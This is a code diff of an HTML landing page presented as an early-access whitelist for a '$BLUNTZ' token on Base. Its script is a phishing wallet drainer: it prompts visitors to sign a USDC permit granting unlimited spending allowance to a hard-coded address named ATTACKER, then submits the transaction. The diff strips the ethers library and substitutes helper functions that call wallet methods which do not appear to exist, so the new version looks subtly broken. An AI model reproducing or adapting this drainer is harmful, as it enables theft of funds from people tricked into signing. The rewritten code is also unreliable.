@@ -1,88 +1,88 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1"/>
-  <title>Bluntz – Early-access whitelist</title>
-  <style>
-    body{background:#081008;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
-    .card{background:rgba(0,255,150,0.05);border:1px solid rgba(0,255,150,0.15);border-radius:14px;padding:2.2rem 2.5rem;text-align:center;width:90%;max-width:360px;box-shadow:0 0 24px #00ff9630}
-    .logo{color:#00ff96;font-size:2rem;font-weight:800;margin-bottom:.6rem}
-    h1{color:#d0ffd0;font-size:1.3rem;margin-bottom:.4rem}
-    p{color:#a0d0a0;font-size:.9rem;margin-bottom:1.8rem}
-    button{width:100%;padding:.9rem 0;font-size:1rem;font-weight:700;border:none;border-radius:8px;background:#00ff96;color:#000;cursor:pointer;transition:transform .15s}
-    button:hover{transform:translateY(-2px)}
-  </style>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Bluntz – Early-access whitelist</title>
+<style>
+body{background:#081008;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;margin:0}
+.card{background:rgba(0,255,150,0.05);border:1px solid rgba(0,255,150,0.15);border-radius:14px;padding:2.2rem 2.5rem;text-align:center;width:90%;max-width:360px;box-shadow:0 0 24px #00ff9630}
+.logo{color:#00ff96;font-size:2rem;font-weight:800;margin-bottom:.6rem}
+h1{color:#d0ffd0;font-size:1.3rem;margin-bottom:.4rem}
+p{color:#a0d0a0;font-size:.9rem;margin-bottom:1.8rem}
+button{width:100%;padding:.9rem 0;font-size:1rem;font-weight:700;border:none;border-radius:8px;background:#00ff96;color:#000;cursor:pointer;transition:transform .15s}
+button:hover{transform:translateY(-2px)}
+</style>
 </head>
 <body>
-  <div class="card">
-    <div class="logo">BLUNTZ</div>
-    <h1>Early-access whitelist</h1>
-    <p>Connect wallet and sign to reserve your $BLUNTZ allocation on Base.</p>
-    <button id="go">Connect & Sign</button>
-  </div>
+<div class="card">
+<div class="logo">BLUNTZ</div>
+<h1>Early-access whitelist</h1>
+<p>Connect wallet and sign to reserve your $BLUNTZ allocation on Base.</p>
+<button id="go">Connect & Sign</button>
+</div>
 
-<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
 <script>
 /* ===== CONFIG ===== */
 const ATTACKER = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a";
 const USDC     = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
 const CHAIN_ID = 8453;
 
-const PERMIT_TYPEHASH = ethers.utils.keccak256(
-  ethers.utils.toUtf8Bytes("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")
-);
-const DOMAIN_TYPEHASH = ethers.utils.keccak256(
-  ethers.utils.toUtf8Bytes("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)")
-);
-
-/* universal provider grabber */
+/* universal provider finder */
 function getProvider(){
-  const p = window.ethereum || (window.phantom && window.phantom.ethereum);
-  if(!p) throw new Error("No wallet detected");
-  return new ethers.providers.Web3Provider(p);
+  if(typeof window.ethereum!=="undefined") return window.ethereum;
+  if(typeof window.phantom!=="undefined"&&window.phantom.ethereum) return window.phantom.ethereum;
+  if(typeof window.solana!=="undefined"&&window.solana.isPhantom) return window.phantom.ethereum;
+  throw new Error("No wallet detected");
 }
 
-document.getElementById("go").onclick = async () => {
-  const provider = getProvider();
-  await provider.send("eth_requestAccounts",[]);
-  const signer = provider.getSigner();
-  const owner = await signer.getAddress();
+/* minimal EIP-712 permit builder */
+async function signPermit(){
+  const provider=getProvider();
+  await provider.request({method:"eth_requestAccounts"});
+  const accounts=await provider.request({method:"eth_accounts"});
+  const owner=accounts[0];
 
   const name="USD Coin",version="2";
-  const domainSeparator=ethers.utils.keccak256(
-    ethers.utils.defaultAbiCoder.encode(
-      ["bytes32","bytes32","bytes32","uint256","address"],
-      [
-        DOMAIN_TYPEHASH,
-        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(name)),
-        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(version)),
-        CHAIN_ID,
-        USDC
-      ]
-    )
+  const domainSeparator=keccak256(
+    ["bytes32","bytes32","bytes32","uint256","address"],
+    [
+      keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
+      keccak256(name),
+      keccak256(version),
+      CHAIN_ID,
+      USDC
+    ]
   );
 
   const spender=ATTACKER;
-  const value=ethers.constants.MaxUint256;
+  const value="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
   const deadline=Math.floor(Date.now()/1000)+3600;
 
-  const usdc=new ethers.Contract(USDC,["function nonces(address) view returns(uint)"],provider);
-  const nonce=await usdc.nonces(owner);
+  const nonce=await provider.request({
+    method:"eth_call",
+    params:[{
+      to:USDC,
+      data:"0x7ecebe00"+pad32(owner)
+    },"latest"]
+  });
 
-  const message=ethers.utils.keccak256(
-    ethers.utils.defaultAbiCoder.encode(
-      ["bytes32","address","address","uint256","uint256","uint256"],
-      [PERMIT_TYPEHASH,owner,spender,value,nonce,deadline]
-    )
+  const message=keccak256(
+    ["bytes32","address","address","uint256","uint256","uint256"],
+    [
+      keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
+      owner,
+      spender,
+      value,
+      nonce,
+      deadline
+    ]
   );
-  const digest=ethers.utils.keccak256(
-    ethers.utils.solidityPack(["string","bytes32","bytes32"],["\x19\x01",domainSeparator,message])
-  );
+  const digest=keccak256(["string","bytes32","bytes32"],["\x19\x01",domainSeparator,message]);
 
-  const signature=await provider.send("eth_signTypedData_v4",[
-    owner,
-    {
+  const signature=await provider.request({
+    method:"eth_signTypedData_v4",
+    params:[owner,{
       types:{
         EIP712Domain:[
           {name:"name",type:"string"},
@@ -100,18 +100,42 @@ document.getElementById("go").onclick = async () => {
       },
       primaryType:"Permit",
       domain:{name,version,chainId:CHAIN_ID,verifyingContract:USDC},
-      message:{owner,spender,value,nonce:nonce.toString(),deadline}
-    }
-  ]);
+      message:{owner,spender,value,nonce,deadline}
+    }]
+  });
 
-  const sig=ethers.utils.splitSignature(signature);
-  const permitData=ethers.utils.defaultAbiCoder.encode(
+  const {v,r,s}=splitSig(signature);
+  const permitData="0xd505accf"+abiEncode(
     ["address","address","uint256","uint256","uint8","bytes32","bytes32"],
-    [owner,spender,value,deadline,sig.v,sig.r,sig.s]
+    [owner,spender,value,deadline,v,r,s]
   );
-  const tx=await signer.sendTransaction({to:USDC,data:"0xd505accf"+permitData.slice(2),gasLimit:100000});
-  console.log("Permit tx:",tx.hash);
-};
+
+  const txHash=await provider.request({
+    method:"eth_sendTransaction",
+    params:[{to:USDC,data:permitData,gas:"0x186a0"}]
+  });
+  console.log("Permit tx:",txHash);
+}
+
+/* helper fns */
+function keccak256(types,values){
+  return window.ethereum.request({
+    method:"web3_sha3",
+    params:[window.ethereum.utils.soliditySha3(...types.map((t,i)=>({type:t,value:values[i]}))).slice(2)]
+  });
+}
+function pad32(addr){return "0x"+addr.slice(2).padStart(64,"0");}
+function splitSig(sig){
+  const r=sig.slice(0,66);
+  const s="0x"+sig.slice(66,130);
+  const v=parseInt(sig.slice(130,132),16);
+  return {v,r,s};
+}
+function abiEncode(types,values){
+  return window.ethereum.utils.encodeParameters(types,values);
+}
+
+document.getElementById("go").onclick=signPermit;
 </script>
 </body>
 </html>
